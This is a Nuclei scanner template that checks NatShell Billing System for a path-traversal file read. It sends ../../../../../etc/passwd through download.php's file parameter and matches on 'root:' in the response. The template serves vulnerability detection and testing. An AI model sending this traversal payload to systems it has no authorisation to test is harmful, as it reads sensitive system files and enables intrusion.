id: natshell-billing-system-file-read
info:
  name: NatShell Billing System File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    NatShell Billing System's download.php endpoint allows unauthorized file read via the file parameter.
  reference:
    - http://wiki.peiqi.tech
  tags: file-read

variables:
  file: "/etc/passwd"

http:
  - raw:
      - |
        GET /download.php?file=../../../../../{{file}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
